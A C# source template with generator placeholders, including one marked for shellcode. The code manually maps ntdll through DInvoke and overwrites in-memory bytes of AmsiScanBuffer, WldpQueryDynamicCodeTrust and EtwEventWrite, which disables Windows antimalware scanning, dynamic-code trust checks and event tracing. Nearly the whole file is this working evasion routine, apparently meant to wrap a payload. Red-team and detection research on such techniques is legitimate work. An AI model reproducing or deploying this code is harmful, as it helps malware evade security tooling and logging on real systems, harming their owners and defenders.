using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

using DynamicInvoke = DInvoke.DynamicInvoke;


namespace ####NAMESPACE####
{

    internal class Zetsuei
    {
        //####SHELLCODE####
        public string fn;
        public byte[] bytes;
        public Int32 offset;

        public Zetsuei(string fn, byte[] bytes, Int32 offset)
        {
            this.fn = fn;
            this.bytes = bytes;
            this.offset = offset;
        }
    }
    public static class ####CLASS####
    {
        public static bool ####FUNCTION####(string bincode)
        {

            int code = Convert.ToInt32(bincode, 2);
            if (code > 7) {
                return false;
            }
            List<bool> result = new List<bool> {};

            Dictionary<string, Zetsuei> map = new Dictionary<string, Zetsuei>();

            if (code >= 0x04) {
                map.Add("amsi.dll", new Zetsuei("AmsiScanBuffer", new byte[] { 0x31, 0xff, 0x90 }, 0x001b));
            }
            if (code == 0x02 || code == 0x03 || code == 0x06 || code == 0x07) {
                map.Add("wldp.dll", new Zetsuei("WldpQueryDynamicCodeTrust", new byte[] { 0x44, 0x89, 0x44, 0x24, 0x18, 0x48, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x55, 0x57, 0x48, 0x81, 0xEC, 0xE8, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x6C, 0x24, 0x20, 0x48, 0x8B, 0xFC, 0xB9, 0x3A, 0x00, 0x00, 0x00, 0xB8, 0xCC, 0xCC, 0xCC, 0xCC, 0xF3, 0xAB, 0x48, 0x8B, 0x8C, 0x24, 0x08, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x07, 0xF7, 0x00, 0x00, 0xE8, 0x5C, 0xF7, 0xFF, 0xFF, 0x33, 0xC0, 0x48, 0x8D, 0xA5, 0xC8, 0x00, 0x00, 0x00, 0x5F, 0x5D, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC }, 0x0000));
            }
            if (code % 2 == 1) {
                // x86 patch
                // map.Add("ntdll.dll", new Zetsuei("EtwEventWrite", new byte[] { 0xc2, 0x14, 0x00, 0x00 }, 0x0000));
                map.Add("ntdll.dll", new Zetsuei("EtwEventWrite", new byte[] { 0x48, 0xb8, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0 }, 0x0000));
            }

            DLL ntdll = new DLL("C:\\Windows\\System32\\ntdll.dll");

            IntPtr pHandle = IntPtr.Zero;
            DInvoke.Data.Native.OBJECT_ATTRIBUTES oa = new DInvoke.Data.Native.OBJECT_ATTRIBUTES();
            DInvoke.Data.Native.CLIENT_ID ci = new DInvoke.Data.Native.CLIENT_ID
            {
                UniqueProcess = (IntPtr)System.Diagnostics.Process.GetCurrentProcess().Id
            };


            uint status = 0;
            // NtOpenProcess params
            object[] ntOpenProcessArgs = new object[]{
                pHandle,
                DInvoke.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS,
                oa,
                ci
            };

            status = ntdll.ChaseFunction("NtOpenProcess", typeof(DynamicInvoke.Native.DELEGATES.NtOpenProcess), ntOpenProcessArgs);
            pHandle = (IntPtr)ntOpenProcessArgs[0];

            ntdll.CheckNullPtr(pHandle, "[-] Failed to get process handle");

            foreach (string k in map.Keys)
            {
                Console.WriteLine("[*] Disarming {0}", k);

                var TargetDLL = DynamicInvoke.Generic.LoadModuleFromDisk(k);
                if (TargetDLL == IntPtr.Zero)
                {
                    Console.WriteLine("  [-] FAIL: Get Handle to {0}", k);
                    result.Add(false);
                    continue;
                }
                Console.WriteLine("  [+] SUCCESS: Get Handle to {0}", k);
                Thread.Sleep(1000);

                Zetsuei m;
                if (!map.TryGetValue(k, out m)) {
                    Console.WriteLine("[-] Map error");
                    continue;
                }

                /*
                LdrGetProcedureAddress(
                  IN HMODULE              ModuleHandle,
                  IN PANSI_STRING         FunctionName OPTIONAL,
                  IN WORD                 Oridinal OPTIONAL,
                  OUT PVOID               *FunctionAddress );

                */
                IntPtr functionAddress = IntPtr.Zero;
                byte[] functionName = Encoding.UTF8.GetBytes(m.fn);
                IntPtr pFunctionName = Marshal.AllocHGlobal(functionName.Length);
                Marshal.Copy(functionName, 0, pFunctionName, functionName.Length);

                object[] getProcAddressArgs = new object[]{
                    TargetDLL, // ModuleHanlde
                    pFunctionName, // FunctionName
                    null, // Ordinal, not needed
                    functionAddress // Store procedure address
                };

                functionAddress = DInvoke.DynamicInvoke.Generic.GetExportAddress(TargetDLL, m.fn);

                // Not working, not sure why... maybe pFunctionName should be an ANSI String?
                // status = ntdll.ChaseFunction("LdrGetProcedureAddress", typeof(DynamicInvoke.Native.DELEGATES.LdrGetProcedureAddress), getProcAddressArgs);

                if (status != 0 || functionAddress == IntPtr.Zero)
                {
                    Console.WriteLine("  [-] FAIL: Get Handle to {0}", m.fn);
                    result.Add(false);
                    continue;
                }

                Console.WriteLine("  [+] SUCCESS: Get Handle to {0}", m.fn);

                // Pointing to the right memory address to patch
                functionAddress = functionAddress + m.offset;

                var dwSize = (IntPtr)m.bytes.Length;
                uint oldProtection = 0;
                object[] protectVirtualMemoryParams = { pHandle, functionAddress, dwSize, (uint)0x40, oldProtection };
                status = ntdll.ChaseFunction("NtProtectVirtualMemory", typeof(DynamicInvoke.Native.DELEGATES.NtProtectVirtualMemory), protectVirtualMemoryParams);
                functionAddress = (IntPtr)protectVirtualMemoryParams[1];
                dwSize = (IntPtr)m.bytes.Length;
                oldProtection = (uint)protectVirtualMemoryParams[4];

                if (status != 0)
                {
                    Console.WriteLine("  [-] FAIL: Call to NtProtectVirtualMemory -> Enable Write");
                    result.Add(false);
                    continue;
                }
                Console.WriteLine("  [+] SUCCESS: Call to NtProtectVirtualMemory -> Enable Write");

                var unmanagedPointer = Marshal.AllocHGlobal((Int32)dwSize);
                Marshal.Copy(m.bytes, 0, unmanagedPointer, (Int32)dwSize);
                uint bytesWritten = 0;

                object[] writeVirtualMemoryParams = { pHandle, functionAddress, unmanagedPointer, (uint)dwSize, bytesWritten };
                status = ntdll.ChaseFunction("NtWriteVirtualMemory", typeof(DynamicInvoke.Native.DELEGATES.NtWriteVirtualMemory), writeVirtualMemoryParams);

                if (status != 0)
                {
                    Console.WriteLine("  [-] FAIL: {0} not patched!");
                    result.Add(false);
                    continue;
                }

                Console.WriteLine("  [+] Success. {0} Patched!", k);
                Console.WriteLine("  [*] Restoring memory protection...");
                uint newProtection = 0;

                protectVirtualMemoryParams[3] = oldProtection;
                protectVirtualMemoryParams[4] = newProtection;
                status = ntdll.ChaseFunction("NtProtectVirtualMemory", typeof(DynamicInvoke.Native.DELEGATES.NtProtectVirtualMemory), protectVirtualMemoryParams);


                if (status != 0)
                {
                    Console.WriteLine("[-] FAIL: Call to VirtualProtect -> Disable Write");
                    result.Add(false);
                    continue;
                }
                Console.WriteLine("  [+] Success");
                result.Add(true);
            }
            return !result.Contains(false);
        }


        internal class DLL
        {

            public DInvoke.Data.PE.PE_MANUAL_MAP dll;

            public uint ChaseFunction(string fname, Type ftype, object[] args)
            {
                return (uint)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(this.dll.PEINFO,
                                                                                    this.dll.ModuleBase,
                                                                                    fname,
                                                                                    ftype,
                                                                                    args,
                                                                                    false);
            }

            public DLL(string path)
            {
                this.dll = new DInvoke.Data.PE.PE_MANUAL_MAP();
                this.dll = DInvoke.ManualMap.Map.MapModuleToMemory(path);
            }


            public void CheckNull(object test, string label)
            {
                if (test == null)
                {
                    Console.WriteLine("Error: {0} is null", label);
                    Environment.Exit(1);
                }
            }
            public void CheckNullPtr(IntPtr test, string label)
            {
                if (test == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Error: {0} is INtPtr.Zero", label);
                    Environment.Exit(1);
                }
            }

        }
    }
}